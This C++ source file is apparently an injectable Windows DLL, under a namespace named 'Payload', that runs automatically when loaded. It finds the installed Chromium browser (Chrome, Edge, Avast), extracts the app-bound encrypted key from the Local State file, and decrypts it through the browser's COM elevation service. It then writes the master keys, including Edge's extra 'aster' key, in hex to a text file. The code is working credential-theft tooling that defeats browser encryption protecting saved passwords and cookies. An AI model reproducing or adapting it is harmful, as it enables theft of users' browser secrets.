#include "Common.h"
#include "Bootstrap.h"
#include "Methods.h"
#include "Settings.h"
#include "Elevator.h"
#include <fstream>

using namespace Payload;

std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) throw std::runtime_error("Cannot open Local State");

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) throw std::runtime_error("Key not found");

    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) throw std::runtime_error("Malformed JSON");

    std::string b64 = content.substr(pos, end - pos);

    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);

    if (data.size() < 4) throw std::runtime_error("Invalid key data");
    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

std::string BytesToHex(const std::vector<uint8_t>& bytes) {
    std::string hex;
    hex.reserve(bytes.size() * 2);
    for (auto b : bytes) {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}

void SaveKeyToFile(const std::string& content) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string dir = std::filesystem::path(path).parent_path().string();
    std::string file = dir + "\\chromium_keys.txt";
    std::ofstream out(file, std::ios::app);
    if (out.is_open()) {
        out << content << std::endl;
    }
}

void Execute() {
    auto browser = DetectBrowser();

    Sys::InitApi(false);

    std::vector<uint8_t> masterKey;
    {
        Com::Elevator elevator;
        auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "app_bound_encrypted_key");
        masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
    }

    SaveKeyToFile(browser.name + ":" + BytesToHex(masterKey));

    if (browser.name == "Edge") {
        try {
            auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
            Com::Elevator elevator;
            auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
            SaveKeyToFile("ASTER_KEY:" + BytesToHex(asterKey));
        } catch (...) {}
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        Execute();
        FreeLibraryAndExitThread(hModule, 0);
    }
    return TRUE;
}
